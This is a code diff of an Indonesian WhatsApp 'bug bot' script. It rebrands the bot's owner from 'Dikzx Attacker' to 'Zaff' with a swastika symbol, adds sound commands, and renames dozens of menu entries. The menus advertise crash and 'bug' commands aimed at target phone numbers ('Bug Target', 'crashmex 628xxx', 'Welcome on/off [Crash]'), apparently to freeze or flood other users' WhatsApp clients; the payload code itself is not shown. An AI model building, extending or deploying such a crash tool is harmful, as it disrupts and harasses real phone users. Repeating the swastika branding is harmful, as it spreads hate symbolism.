+case 'zaffsound107':
+case 'zaffsound108':
+case 'zaffsound109':
+case 'zaffsound110':
+case 'zaffsound111':
+case 'zaffsound112':
+case 'zaffsound113':
+case 'zaffsound114':
+case 'zaffsound115':
+case 'zaffsound116':
+case 'zaffsound117':
+case 'zaffsound118':
+case 'zaffsound119':
+case 'zaffsound120':
+case 'zaffsound121':
+case 'zaffsound122':
+case 'zaffsound123':
+case 'zaffsound124':
+case 'zaffsound125':
+case 'zaffsound126':
+case 'zaffsound127':
+case 'zaffsound128':
+case 'zaffsound129':
+case 'zaffsound130':
+case 'zaffsound131':
+case 'zaffsound132':
+case 'zaffsound133':
+case 'zaffsound134':
+case 'zaffsound135':
+case 'zaffsound136':
+case 'zaffsound137':
+case 'zaffsound138':
+case 'zaffsound139':
+case 'zaffsound140':
+case 'zaffsound141':
+case 'zaffsound142':
+case 'zaffsound143':
+case 'zaffsound144':
+case 'zaffsound145':
+case 'zaffsound146':
+case 'zaffsound147':
+case 'zaffsound148':
+case 'zaffsound149':
+case 'zaffsound150':
+case 'zaffsound151':
+case 'zaffsound152':
+case 'zaffsound153':
+case 'zaffsound154':
+case 'zaffsound155':
+case 'zaffsound156':
+case 'zaffsound157':
+case 'zaffsound158':
+case 'zaffsound159':
+case 'zaffsound160':
+case 'zaffsound161':
  if (isBan) throw sticBanLu(from)
 xeony_buffer = await getBuffer(`https://github.com/DGXeon/Tiktokmusic-API/raw/master/tiktokmusic/${command}.mp3`)
 await haikal.sendMessage(m.chat, { audio: xeony_buffer, mimetype: 'audio/mp4', ptt: true }, { quoted: m })
@@ -4374,7 +4374,7 @@ m.reply('on untuk mengaktifkan, off untuk menonaktifkan')
 }
 }
 break
-case 'dikzxghoib': case 'welcome': {
+case 'zaffghoib': case 'welcome': {
 if (!isCreator) return
 if (isBan) throw sticBanLu(from)
 
@@ -4543,7 +4543,7 @@ jpegThumbnail:log0,
 caption: `
 ◎ Lib : Multi-Device
 ◎ Terbit : *01-09-1999*
-◎ Owner : © ꪶ⸸⁶⁶⁶»𝐃𝐢𝐤𝐳𝐱 𝐀𝐭𝐭𝐚𝐜𝐤𝐞𝐫«⁶⁶⁶⸸ꫂ͢
+◎ Owner : © ꪶ⸸⁶⁶⁶»Zaff卐«⁶⁶⁶⸸ꫂ͢
 
 [ 🇲🇨 Ini adalah Bot Pribadi Tekan Link Di Bawah Untuk Bergabung ]`,
 footer: haikal.user.name,
@@ -4557,20 +4557,20 @@ break*/
 case 'menu': {
 if (isBan) throw sticBanLu(from)
 haikal.sendMessage(m.chat, { image: kalimage, caption: `
-◎ ꪶ⸸⁶⁶⁶»𝐃𝐢𝐤𝐳𝐱 𝐀𝐭𝐭𝐚𝐜𝐤𝐞𝐫«⁶⁶⁶⸸ꫂ͢
+◎ ꪶ⸸⁶⁶⁶»Zaff卐«⁶⁶⁶⸸ꫂ͢
 ◎ 𝐋𝐢𝐛 : 𝐌𝐮𝐥𝐭𝐢-𝐃𝐞𝐯𝐢𝐜𝐞
 ◎ 𝐕𝐞𝐫𝐬𝐢𝐨𝐧 𝟏𝟎
  ▰▱▰▱▰▱▰▱▰▱▰▱▰▱
-╭━━❍ꪶ⸸⁶⁶⁶»𝐃𝐢𝐤𝐳𝐱 𝐀𝐭𝐭𝐚𝐜𝐤𝐞𝐫«⁶⁶⁶⸸ꫂ͢❍━━╮
+╭━━❍ꪶ⸸⁶⁶⁶»Zaff卐«⁶⁶⁶⸸ꫂ͢❍━━╮
 ┃╭━━━━━━━━━━━━━━━━╾•
 ┃┃   ❍ 𝙈𝙀𝙉𝙐 𝘽𝙐𝙂 ❍
 ┃╰━━━━━━━━━━━━━━━━╾•
 ┃ ┃ ╭┈────────────╮
 ┃ ┃│⃟•╾ 𝐁𝐮𝐠𝐦𝐞𝐧𝐮➢
 ┃ ┃ ╰┈────────────╯
-╰━━╼⃟݊⃟̥⃝̇݊݊⃟ ꪶ⸸⁶⁶⁶»𝐃𝐢𝐤𝐳𝐱 𝐀𝐭𝐭𝐚𝐜𝐤𝐞𝐫«⁶⁶⁶⸸ꫂ͢ ݊⃟̥⃝̇݊⃟╾━━╯
+╰━━╼⃟݊⃟̥⃝̇݊݊⃟ ꪶ⸸⁶⁶⁶»Zaff卐«⁶⁶⁶⸸ꫂ͢ ݊⃟̥⃝̇݊⃟╾━━╯
  ▰▱▰▱▰▱▰▱▰▱▰▱▰▱
-╭━━❍ꪶ⸸⁶⁶⁶»𝐃𝐢𝐤𝐳𝐱 𝐀𝐭𝐭𝐚𝐜𝐤𝐞𝐫«⁶⁶⁶⸸ꫂ͢❍━━╮
+╭━━❍ꪶ⸸⁶⁶⁶»Zaff卐«⁶⁶⁶⸸ꫂ͢❍━━╮
 ┃ ╭━━━━━━━━━━━━━━━━╮
 ┃ ┃ ╭┈────────────╮
 ┃ ┃ │ ❍ 𝑴𝑬𝑵𝑼_𝑨𝑼𝑻𝑶 ❍
@@ -4582,7 +4582,7 @@ haikal.sendMessage(m.chat, { image: kalimage, caption: `
 ┃│⃟•╾ 𝐀𝐮𝐭𝐨𝐚𝐯𝐚𝐢𝐥𝐚𝐛𝐥𝐞 𝐨𝐧 / 𝐨𝐟𝐟
 ┃│⃟•╾ 𝐖𝐞𝐥𝐜𝐨𝐦𝐞 𝐨𝐧 / 𝐨𝐟𝐟 [ Crash ]
 ┃╰━━━━━━━━━━━━━━━╯
-┣━━━╼⃟݊⃟̥⃝̇݊݊⃟ꪶ⸸⁶⁶⁶»𝐃𝐢𝐤𝐳𝐱 𝐀𝐭𝐭𝐚𝐜𝐤𝐞𝐫«⁶⁶⁶⸸ꫂ͢ ݊⃟̥⃝̇݊⃟╾━━━•
+┣━━━╼⃟݊⃟̥⃝̇݊݊⃟ꪶ⸸⁶⁶⁶»Zaff卐«⁶⁶⁶⸸ꫂ͢ ݊⃟̥⃝̇݊⃟╾━━━•
 ┃╭━━━━━━━━━━━━━━━━╾•
 ┃┃   ❍ 𝑴𝑬𝑵𝑼 𝙈𝙊𝘿𝙎 ❍
 ┃╰━━━━━━━━━━━━━━━━╾•
@@ -4603,9 +4603,9 @@ haikal.sendMessage(m.chat, { image: kalimage, caption: `
 ┃│⃟•╾ 𝐃𝐨𝐰𝐧𝐥𝐨𝐚𝐝𝐦𝐞𝐧𝐮➢
 ┃│⃟•╾ 𝐎𝐰𝐧𝐞𝐫𝐦𝐞𝐧𝐮➢
 ┃╰━━━━━━━━━━━━━━━╯
-╰━━━╼⃟݊⃟̥⃝̇݊݊⃟ ꪶ⸸⁶⁶⁶»𝐃𝐢𝐤𝐳𝐱 𝐀𝐭𝐭𝐚𝐜𝐤𝐞𝐫«⁶⁶⁶⸸ꫂ͢ ݊⃟̥⃝̇݊⃟╾━━━╯
+╰━━━╼⃟݊⃟̥⃝̇݊݊⃟ ꪶ⸸⁶⁶⁶»Zaff卐«⁶⁶⁶⸸ꫂ͢ ݊⃟̥⃝̇݊⃟╾━━━╯
  ▰▱▰▱▰▱▰▱▰▱▰▱▰▱
-© ꪶ⸸⁶⁶⁶»𝐃𝐢𝐤𝐳𝐱 𝐀𝐭𝐭𝐚𝐜𝐤𝐞𝐫«⁶⁶⁶⸸ꫂ͢`, contextInfo:{"externalAdReply": {"title": `SC ꪶ⸸⁶⁶⁶»𝐃𝐢𝐤𝐳𝐱 𝐀𝐭𝐭𝐚𝐜𝐤𝐞𝐫«⁶⁶⁶⸸ꫂ͢`,"body": `Selamat ${salam} kak ${pushname}`,
+© ꪶ⸸⁶⁶⁶»Zaff卐«⁶⁶⁶⸸ꫂ͢`, contextInfo:{"externalAdReply": {"title": `SC ꪶ⸸⁶⁶⁶»Zaff卐«⁶⁶⁶⸸ꫂ͢`,"body": `Selamat ${salam} kak ${pushname}`,
 previewType: "PHOTO",
 showAdAttribution: true,
 sourceUrl: `https://youtube.com/c/HwModsWa857`,
@@ -4660,7 +4660,7 @@ haikal.sendMessage(m.chat, { image: kalimage, caption: `© Hay Kak ${pushname} �
 ╠➤🍎 [ 𝐣𝐮𝐦𝐥𝐚𝐡 ]
 ╠➤🍒 [ 𝐣𝐮𝐦𝐥𝐚𝐡 ]
 ╠➤🍓 [ 𝐣𝐮𝐦𝐥𝐚𝐡 ]
-╚════[ ꪶ⸸⁶⁶⁶»𝐃𝐢𝐤𝐳𝐱 𝐀𝐭𝐭𝐚𝐜𝐤𝐞𝐫«⁶⁶⁶⸸ꫂ͢ ]══════⊱
+╚════[ ꪶ⸸⁶⁶⁶»Zaff卐«⁶⁶⁶⸸ꫂ͢ ]══════⊱
 ╔══════[ 𝐉𝐀𝐃𝐈 𝐁𝐔𝐆 𝐕𝐈𝐏 ]══════⊱
 ╠➤𝐣𝐚𝐝𝐢𝐤𝐚𝐭𝐚𝐥𝐨𝐠 [𝐫𝐞𝐩𝐥𝐲 𝐬𝐭𝐢𝐜𝐤𝐞𝐫] 𝐣𝐮𝐦𝐥𝐚𝐡
 ╠➤𝐣𝐚𝐝𝐢𝐩𝐨𝐥𝐥𝐢𝐧𝐠 [𝐌𝐚𝐬𝐮𝐤𝐚𝐧 𝐭𝐞𝐱𝐭 𝐧𝐲𝐚]
@@ -4683,7 +4683,7 @@ haikal.sendMessage(m.chat, { image: kalimage, caption: `© Hay Kak ${pushname} �
 ╠➤𝐣𝐚𝐝𝐢𝐛𝐮𝐠𝐬𝐰 [𝐌𝐚𝐬𝐮𝐤𝐚𝐧 𝐭𝐞𝐱𝐭 𝐧𝐲𝐚]
 ╠➤𝐣𝐚𝐝𝐢𝐛𝐮𝐠𝐛𝐨𝐤𝐞𝐩 [𝐌𝐚𝐬𝐮𝐤𝐚𝐧 𝐭𝐞𝐱𝐭 𝐧𝐲𝐚]
 ╠➤𝐣𝐚𝐝𝐢𝐛𝐮𝐠𝐛𝐮𝐭𝐭𝐨𝐧 [𝐌𝐚𝐬𝐮𝐤𝐚𝐧 𝐭𝐞𝐱𝐭 𝐧𝐲𝐚]
-╚════[ ꪶ⸸⁶⁶⁶»𝐃𝐢𝐤𝐳𝐱 𝐀𝐭𝐭𝐚𝐜𝐤𝐞𝐫«⁶⁶⁶⸸ꫂ͢ ]══════⊱
+╚════[ ꪶ⸸⁶⁶⁶»Zaff卐«⁶⁶⁶⸸ꫂ͢ ]══════⊱
 ╔════[ 𝐕𝐈𝐏 ]═══════⊱
 ╠➤🥀 [ 𝐣𝐮𝐦𝐥𝐚𝐡 ]
 ╠➤🐍 [ 𝐣𝐮𝐦𝐥𝐚𝐡 ]
@@ -4691,112 +4691,112 @@ haikal.sendMessage(m.chat, { image: kalimage, caption: `© Hay Kak ${pushname} �
 ╠➤🗿 [ 𝐣𝐮𝐦𝐥𝐚𝐡 ]
 ╠➤🌷 [ 𝐣𝐮𝐦𝐥𝐚𝐡 ]
 ╠➤𝐦𝐞𝐱𝐝𝐞𝐦𝐚𝐦 [ 𝐣𝐮𝐦𝐥𝐚𝐡 ]
-╠➤𝐝𝐢𝐤𝐳𝐱𝟏 [ 𝐣𝐮𝐦𝐥𝐚𝐡 ]
-╠➤𝐝𝐢𝐤𝐳𝐱𝟐 [ 𝐣𝐮𝐦𝐥𝐚𝐡 ]
-╠➤𝐝𝐢𝐤𝐳𝐱𝟑 [ 𝐣𝐮𝐦𝐥𝐚𝐡 ]
-╠➤𝐝𝐢𝐤𝐳𝐱𝟒 [ 𝐣𝐮𝐦𝐥𝐚𝐡 ]
-╠➤𝐝𝐢𝐤𝐳𝐱𝟓 [ 𝐣𝐮𝐦𝐥𝐚𝐡 ]
-╠➤𝐝𝐢𝐤𝐳𝐱𝟔 [ 𝐣𝐮𝐦𝐥𝐚𝐡 ]
-╠➤𝐝𝐢𝐤𝐳𝐱𝟕 [ 𝐣𝐮𝐦𝐥𝐚𝐡 ]
-╠➤𝐝𝐢𝐤𝐳𝐱𝟖 [ 𝐣𝐮𝐦𝐥𝐚𝐡 ]
-╠➤𝐝𝐢𝐤𝐳𝐱𝟗 [ 𝐣𝐮𝐦𝐥𝐚𝐡 ]
-╠➤𝐝𝐢𝐤𝐳𝐱𝟏𝟎 [ 𝐣𝐮𝐦𝐥𝐚𝐡 ]
-╠➤𝐝𝐢𝐤𝐳𝐱𝟏𝟏 [ 𝐣𝐮𝐦𝐥𝐚𝐡 ]
-╠➤𝐝𝐢𝐤𝐳𝐱𝟏𝟐 [ 𝐣𝐮𝐦𝐥𝐚𝐡 ]
-╠➤𝐝𝐢𝐤𝐳𝐱𝟏𝟑 [ 𝐣𝐮𝐦𝐥𝐚𝐡 ]
-╠➤𝐝𝐢𝐤𝐳𝐱𝟏𝟒 [ 𝐣𝐮𝐦𝐥𝐚𝐡 ]
-╠➤𝐝𝐢𝐤𝐳𝐱𝟏𝟓 [ 𝐣𝐮𝐦𝐥𝐚𝐡 ]
-╠➤𝐝𝐢𝐤𝐳𝐱𝟏𝟔 [ 𝐣𝐮𝐦𝐥𝐚𝐡 ]
-╠➤𝐝𝐢𝐤𝐳𝐱𝟏𝟕 [ 𝐣𝐮𝐦𝐥𝐚𝐡 ]
-╠➤𝐝𝐢𝐤𝐳𝐱𝟏𝟖 [ 𝐣𝐮𝐦𝐥𝐚𝐡 ]
-╠➤𝐝𝐢𝐤𝐳𝐱𝟏𝟗 [ 𝐣𝐮𝐦𝐥𝐚𝐡 ]
-╠➤𝐝𝐢𝐤𝐳𝐱𝟐𝟎 [ 𝐣𝐮𝐦𝐥𝐚𝐡 ]
-╠➤𝐝𝐢𝐤𝐳𝐱𝟐𝟏 [ 𝐣𝐮𝐦𝐥𝐚𝐡 ]
-╠➤𝐝𝐢𝐤𝐳𝐱𝟐𝟐 [ 𝐣𝐮𝐦𝐥𝐚𝐡 ]
-╠➤𝐝𝐢𝐤𝐳𝐱𝟐𝟑 [ 𝐣𝐮𝐦𝐥𝐚𝐡 ]
-╠➤𝐝𝐢𝐤𝐳𝐱𝟐𝟒 [ 𝐣𝐮𝐦𝐥𝐚𝐡 ]
-╠➤𝐝𝐢𝐤𝐳𝐱𝟐𝟓 [ 𝐣𝐮𝐦𝐥𝐚𝐡 ]
-╠➤𝐝𝐢𝐤𝐳𝐱𝟐𝟔 [ 𝐣𝐮𝐦𝐥𝐚𝐡 ]
-╠➤𝐝𝐢𝐤𝐳𝐱𝟐𝟕 [ 𝐣𝐮𝐦𝐥𝐚𝐡 ]
-╠➤𝐝𝐢𝐤𝐳𝐱𝟐𝟖 [ 𝐣𝐮𝐦𝐥𝐚𝐡 ]
-╠➤𝐝𝐢𝐤𝐳𝐱𝟐𝟗 [ 𝐣𝐮𝐦𝐥𝐚𝐡 ]
-╠➤𝐝𝐢𝐤𝐳𝐱𝟑𝟎 [ 𝐣𝐮𝐦𝐥𝐚𝐡 ]
-╠➤𝐝𝐢𝐤𝐳𝐱𝟑𝟏 [ 𝐣𝐮𝐦𝐥𝐚𝐡 ]
-╠➤𝐝𝐢𝐤𝐳𝐱𝟑𝟐 [ 𝐣𝐮𝐦𝐥𝐚𝐡 ]
-╠➤𝐝𝐢𝐤𝐳𝐱𝟑𝟑 [ 𝐣𝐮𝐦𝐥𝐚𝐡 ]
-╠➤𝐝𝐢𝐤𝐳𝐱𝟑𝟒 [ 𝐣𝐮𝐦𝐥𝐚𝐡 ]
-╠➤𝐝𝐢𝐤𝐳𝐱𝟑𝟓 [ 𝐣𝐮𝐦𝐥𝐚𝐡 ]
-╠➤𝐝𝐢𝐤𝐳𝐱𝟑𝟔 [ 𝐣𝐮𝐦𝐥𝐚𝐡 ]
-╠➤𝐝𝐢𝐤𝐳𝐱𝟑𝟕 [ 𝐣𝐮𝐦𝐥𝐚𝐡 ]
-╠➤𝐝𝐢𝐤𝐳𝐱𝟑𝟖 [ 𝐣𝐮𝐦𝐥𝐚𝐡 ]
-╠➤𝐝𝐢𝐤𝐳𝐱𝟑𝟗 [ 𝐣𝐮𝐦𝐥𝐚𝐡 ]
-╠➤𝐝𝐢𝐤𝐳𝐱𝟒𝟎 [ 𝐣𝐮𝐦𝐥𝐚𝐡 ]
-╠➤𝐝𝐢𝐤𝐳𝐱𝟒𝟏 [ 𝐣𝐮𝐦𝐥𝐚𝐡 ]
-╠➤𝐝𝐢𝐤𝐳𝐱𝟒𝟐 [ 𝐣𝐮𝐦𝐥𝐚𝐡 ]
-╠➤𝐝𝐢𝐤𝐳𝐱𝟒𝟑 [ 𝐣𝐮𝐦𝐥𝐚𝐡 ]
-╠➤𝐝𝐢𝐤𝐳𝐱𝟒𝟒 [ 𝐣𝐮𝐦𝐥𝐚𝐡 ]
-╠➤𝐝𝐢𝐤𝐳𝐱𝟒𝟓 [ 𝐣𝐮𝐦𝐥𝐚𝐡 ]
-╠➤𝐝𝐢𝐤𝐳𝐱𝟒𝟔 [ 𝐣𝐮𝐦𝐥𝐚𝐡 ]
-╠➤𝐝𝐢𝐤𝐳𝐱𝟒𝟕 [ 𝐣𝐮𝐦𝐥𝐚𝐡 ]
-╠➤𝐝𝐢𝐤𝐳𝐱𝟒𝟖 [ 𝐣𝐮𝐦𝐥𝐚𝐡 ]
-╠➤𝐝𝐢𝐤𝐳𝐱𝟒𝟗 [ 𝐣𝐮𝐦𝐥𝐚𝐡 ]
-╠➤𝐝𝐢𝐤𝐳𝐱𝟓𝟎 [ 𝐣𝐮𝐦𝐥𝐚𝐡 ]
-╠➤𝐝𝐢𝐤𝐳𝐱𝟓𝟏 [ 𝐣𝐮𝐦𝐥𝐚𝐡 ]
-╠➤𝐝𝐢𝐤𝐳𝐱𝟓𝟐 [ 𝐣𝐮𝐦𝐥𝐚𝐡 ]
-╠➤𝐝𝐢𝐤𝐳𝐱𝟓𝟑 [ 𝐣𝐮𝐦𝐥𝐚𝐡 ]
-╠➤𝐝𝐢𝐤𝐳𝐱𝟓𝟒 [ 𝐣𝐮𝐦𝐥𝐚𝐡 ]
-╠➤𝐝𝐢𝐤𝐳𝐱𝟓𝟓 [ 𝐣𝐮𝐦𝐥𝐚𝐡 ]
-╠➤𝐝𝐢𝐤𝐳𝐱𝟓𝟔 [ 𝐣𝐮𝐦𝐥𝐚𝐡 ]
-╠➤𝐝𝐢𝐤𝐳𝐱𝟓𝟕 [ 𝐣𝐮𝐦𝐥𝐚𝐡 ]
-╠➤𝐝𝐢𝐤𝐳𝐱𝟓𝟖 [ 𝐣𝐮𝐦𝐥𝐚𝐡 ]
-╠➤𝐝𝐢𝐤𝐳𝐱𝟓𝟗 [ 𝐣𝐮𝐦𝐥𝐚𝐡 ]
-╠➤𝐝𝐢𝐤𝐳𝐱𝟔𝟎 [ 𝐣𝐮𝐦𝐥𝐚𝐡 ]
+╠➤𝐳𝐚𝐟𝐟𝟏 [ 𝐣𝐮𝐦𝐥𝐚𝐡 ]
+╠➤𝐳𝐚𝐟𝐟𝟐 [ 𝐣𝐮𝐦𝐥𝐚𝐡 ]
+╠➤𝐳𝐚𝐟𝐟𝟑 [ 𝐣𝐮𝐦𝐥𝐚𝐡 ]
+╠➤𝐳𝐚𝐟𝐟𝟒 [ 𝐣𝐮𝐦𝐥𝐚𝐡 ]
+╠➤𝐳𝐚𝐟𝐟𝟓 [ 𝐣𝐮𝐦𝐥𝐚𝐡 ]
+╠➤𝐳𝐚𝐟𝐟𝟔 [ 𝐣𝐮𝐦𝐥𝐚𝐡 ]
+╠➤𝐳𝐚𝐟𝐟𝟕 [ 𝐣𝐮𝐦𝐥𝐚𝐡 ]
+╠➤𝐳𝐚𝐟𝐟𝟖 [ 𝐣𝐮𝐦𝐥𝐚𝐡 ]
+╠➤𝐳𝐚𝐟𝐟𝟗 [ 𝐣𝐮𝐦𝐥𝐚𝐡 ]
+╠➤𝐳𝐚𝐟𝐟𝟏𝟎 [ 𝐣𝐮𝐦𝐥𝐚𝐡 ]
+╠➤𝐳𝐚𝐟𝐟𝟏𝟏 [ 𝐣𝐮𝐦𝐥𝐚𝐡 ]
+╠➤𝐳𝐚𝐟𝐟𝟏𝟐 [ 𝐣𝐮𝐦𝐥𝐚𝐡 ]
+╠➤𝐳𝐚𝐟𝐟𝟏𝟑 [ 𝐣𝐮𝐦𝐥𝐚𝐡 ]
+╠➤𝐳𝐚𝐟𝐟𝟏𝟒 [ 𝐣𝐮𝐦𝐥𝐚𝐡 ]
+╠➤𝐳𝐚𝐟𝐟𝟏𝟓 [ 𝐣𝐮𝐦𝐥𝐚𝐡 ]
+╠➤𝐳𝐚𝐟𝐟𝟏𝟔 [ 𝐣𝐮𝐦𝐥𝐚𝐡 ]
+╠➤𝐳𝐚𝐟𝐟𝟏𝟕 [ 𝐣𝐮𝐦𝐥𝐚𝐡 ]
+╠➤𝐳𝐚𝐟𝐟𝟏𝟖 [ 𝐣𝐮𝐦𝐥𝐚𝐡 ]
+╠➤𝐳𝐚𝐟𝐟𝟏𝟗 [ 𝐣𝐮𝐦𝐥𝐚𝐡 ]
+╠➤𝐳𝐚𝐟𝐟𝟐𝟎 [ 𝐣𝐮𝐦𝐥𝐚𝐡 ]
+╠➤𝐳𝐚𝐟𝐟𝟐𝟏 [ 𝐣𝐮𝐦𝐥𝐚𝐡 ]
+╠➤𝐳𝐚𝐟𝐟𝟐𝟐 [ 𝐣𝐮𝐦𝐥𝐚𝐡 ]
+╠➤𝐳𝐚𝐟𝐟𝟐𝟑 [ 𝐣𝐮𝐦𝐥𝐚𝐡 ]
+╠➤𝐳𝐚𝐟𝐟𝟐𝟒 [ 𝐣𝐮𝐦𝐥𝐚𝐡 ]
+╠➤𝐳𝐚𝐟𝐟𝟐𝟓 [ 𝐣𝐮𝐦𝐥𝐚𝐡 ]
+╠➤𝐳𝐚𝐟𝐟𝟐𝟔 [ 𝐣𝐮𝐦𝐥𝐚𝐡 ]
+╠➤𝐳𝐚𝐟𝐟𝟐𝟕 [ 𝐣𝐮𝐦𝐥𝐚𝐡 ]
+╠➤𝐳𝐚𝐟𝐟𝟐𝟖 [ 𝐣𝐮𝐦𝐥𝐚𝐡 ]
+╠➤𝐳𝐚𝐟𝐟𝟐𝟗 [ 𝐣𝐮𝐦𝐥𝐚𝐡 ]
+╠➤𝐳𝐚𝐟𝐟𝟑𝟎 [ 𝐣𝐮𝐦𝐥𝐚𝐡 ]
+╠➤𝐳𝐚𝐟𝐟𝟑𝟏 [ 𝐣𝐮𝐦𝐥𝐚𝐡 ]
+╠➤𝐳𝐚𝐟𝐟𝟑𝟐 [ 𝐣𝐮𝐦𝐥𝐚𝐡 ]
+╠➤𝐳𝐚𝐟𝐟𝟑𝟑 [ 𝐣𝐮𝐦𝐥𝐚𝐡 ]
+╠➤𝐳𝐚𝐟𝐟𝟑𝟒 [ 𝐣𝐮𝐦𝐥𝐚𝐡 ]
+╠➤𝐳𝐚𝐟𝐟𝟑𝟓 [ 𝐣𝐮𝐦𝐥𝐚𝐡 ]
+╠➤𝐳𝐚𝐟𝐟𝟑𝟔 [ 𝐣𝐮𝐦𝐥𝐚𝐡 ]
+╠➤𝐳𝐚𝐟𝐟𝟑𝟕 [ 𝐣𝐮𝐦𝐥𝐚𝐡 ]
+╠➤𝐳𝐚𝐟𝐟𝟑𝟖 [ 𝐣𝐮𝐦𝐥𝐚𝐡 ]
+╠➤𝐳𝐚𝐟𝐟𝟑𝟗 [ 𝐣𝐮𝐦𝐥𝐚𝐡 ]
+╠➤𝐳𝐚𝐟𝐟𝟒𝟎 [ 𝐣𝐮𝐦𝐥𝐚𝐡 ]
+╠➤𝐳𝐚𝐟𝐟𝟒𝟏 [ 𝐣𝐮𝐦𝐥𝐚𝐡 ]
+╠➤𝐳𝐚𝐟𝐟𝟒𝟐 [ 𝐣𝐮𝐦𝐥𝐚𝐡 ]
+╠➤𝐳𝐚𝐟𝐟𝟒𝟑 [ 𝐣𝐮𝐦𝐥𝐚𝐡 ]
+╠➤𝐳𝐚𝐟𝐟𝟒𝟒 [ 𝐣𝐮𝐦𝐥𝐚𝐡 ]
+╠➤𝐳𝐚𝐟𝐟𝟒𝟓 [ 𝐣𝐮𝐦𝐥𝐚𝐡 ]
+╠➤𝐳𝐚𝐟𝐟𝟒𝟔 [ 𝐣𝐮𝐦𝐥𝐚𝐡 ]
+╠➤𝐳𝐚𝐟𝐟𝟒𝟕 [ 𝐣𝐮𝐦𝐥𝐚𝐡 ]
+╠➤𝐳𝐚𝐟𝐟𝟒𝟖 [ 𝐣𝐮𝐦𝐥𝐚𝐡 ]
+╠➤𝐳𝐚𝐟𝐟𝟒𝟗 [ 𝐣𝐮𝐦𝐥𝐚𝐡 ]
+╠➤𝐳𝐚𝐟𝐟𝟓𝟎 [ 𝐣𝐮𝐦𝐥𝐚𝐡 ]
+╠➤𝐳𝐚𝐟𝐟𝟓𝟏 [ 𝐣𝐮𝐦𝐥𝐚𝐡 ]
+╠➤𝐳𝐚𝐟𝐟𝟓𝟐 [ 𝐣𝐮𝐦𝐥𝐚𝐡 ]
+╠➤𝐳𝐚𝐟𝐟𝟓𝟑 [ 𝐣𝐮𝐦𝐥𝐚𝐡 ]
+╠➤𝐳𝐚𝐟𝐟𝟓𝟒 [ 𝐣𝐮𝐦𝐥𝐚𝐡 ]
+╠➤𝐳𝐚𝐟𝐟𝟓𝟓 [ 𝐣𝐮𝐦𝐥𝐚𝐡 ]
+╠➤𝐳𝐚𝐟𝐟𝟓𝟔 [ 𝐣𝐮𝐦𝐥𝐚𝐡 ]
+╠➤𝐳𝐚𝐟𝐟𝟓𝟕 [ 𝐣𝐮𝐦𝐥𝐚𝐡 ]
+╠➤𝐳𝐚𝐟𝐟𝟓𝟖 [ 𝐣𝐮𝐦𝐥𝐚𝐡 ]
+╠➤𝐳𝐚𝐟𝐟𝟓𝟗 [ 𝐣𝐮𝐦𝐥𝐚𝐡 ]
+╠➤𝐳𝐚𝐟𝐟𝟔𝟎 [ 𝐣𝐮𝐦𝐥𝐚𝐡 ]
 ╠➤𝐛𝐮𝐭𝐭𝐨𝐧𝐤𝐞𝐦𝐚𝐭𝐢𝐚𝐧 [ 𝐣𝐮𝐦𝐥𝐚𝐡 ]
 ╠➤𝐦𝐞𝐱𝐜𝐫𝐨𝐭 [ 𝐣𝐮𝐦𝐥𝐚𝐡 ]
-╠➤𝐝𝐢𝐤𝐳𝐱𝐧𝐢𝐡 [ 𝐣𝐮𝐦𝐥𝐚𝐡 ]
+╠➤𝐳𝐚𝐟𝐟𝐧𝐢𝐡 [ 𝐣𝐮𝐦𝐥𝐚𝐡 ]
 ╠➤𝐨𝐤𝐞𝐦𝐞𝐱 [ 𝐣𝐮𝐦𝐥𝐚𝐡 ]
 ╠➤𝐚𝐡𝐲𝐚𝐧𝐠𝐛𝐞𝐭𝐮𝐥 [ 𝐣𝐮𝐦𝐥𝐚𝐡 ]
 ╠➤𝐚𝐦𝐩𝐮𝐧𝐬𝐮𝐡𝐮 [ 𝐣𝐮𝐦𝐥𝐚𝐡 ]
-╚════[ ꪶ⸸⁶⁶⁶𝐝𝐢𝐤𝐳𝐱⁶⁶⁶⸸ꫂ͢ ]══════
+╚════[ ꪶ⸸⁶⁶⁶𝐳𝐚𝐟𝐟⁶⁶⁶⸸ꫂ͢ ]══════
 ▬▭▬▭▬▭▬▭▬▬▭▬▭▬
 
 ╔════[ 𝐁𝐔𝐆 𝐒𝐏𝐄𝐂𝐈𝐀𝐋 ]══════⊱
 ╠➤𝐚𝐟𝐤 { 𝐤𝐚𝐬𝐢𝐡 𝐫𝐞𝐚𝐜𝐭𝐢𝐨𝐧𝐬 }
-╠➤𝐝𝐢𝐤𝐳𝐱𝐠𝐡𝐨𝐢𝐛 [ 𝐨𝐧 / 𝐨𝐟𝐟 ]
-╠➤𝐝𝐢𝐤𝐳𝐱𝐣𝐚𝐠𝐨𝐚𝐧 [ 𝐫𝐞𝐩𝐥𝐲 𝐭𝐚𝐫𝐠𝐞𝐭 ]
-╠➤𝐝𝐢𝐤𝐳𝐱𝐬𝐚𝐧𝐠𝐞 [ 𝐇𝐚𝐫𝐮𝐬 𝐌𝐞𝐧𝐣𝐚𝐝𝐢 𝐀𝐝𝐦𝐢𝐧 ]
+╠➤𝐳𝐚𝐟𝐟𝐠𝐡𝐨𝐢𝐛 [ 𝐨𝐧 / 𝐨𝐟𝐟 ]
+╠➤𝐳𝐚𝐟𝐟𝐣𝐚𝐠𝐨𝐚𝐧 [ 𝐫𝐞𝐩𝐥𝐲 𝐭𝐚𝐫𝐠𝐞𝐭 ]
+╠➤𝐳𝐚𝐟𝐟𝐬𝐚𝐧𝐠𝐞 [ 𝐇𝐚𝐫𝐮𝐬 𝐌𝐞𝐧𝐣𝐚𝐝𝐢 𝐀𝐝𝐦𝐢𝐧 ]
 ╠➤𝐛𝐮𝐠𝐭𝐢𝐤𝐭𝐨𝐤 [ 𝐋𝐢𝐧𝐤 ] - 𝐁𝐮𝐠 𝐒𝐰
-╚════[ ꪶ⸸⁶⁶⁶𝐝𝐢𝐤𝐳𝐱⁶⁶⁶⸸ꫂ͢ ]══════⊱
+╚════[ ꪶ⸸⁶⁶⁶𝐳𝐚𝐟𝐟⁶⁶⁶⸸ꫂ͢ ]══════⊱
 ▬▭▬▭▬▭▬▭▬▬▭▬▭▬
 
 ╔══════[ 𝐁𝐔𝐆 𝐓𝐀𝐑𝐆𝐄𝐓 ]══════⊱
 ╠➤🔥 𝟔𝟐𝟖𝐱𝐱𝐱|𝟓|𝟓
 ╠➤ 𝐜𝐫𝐚𝐬𝐡𝐦𝐞𝐱 𝟔𝟐𝟖𝐱𝐱𝐱|𝟓|𝟓
-╠➤𝐝𝐢𝐤𝐳𝐱𝐬𝐤𝐮𝐲 𝟔𝟐𝟖𝐱𝐱𝐱
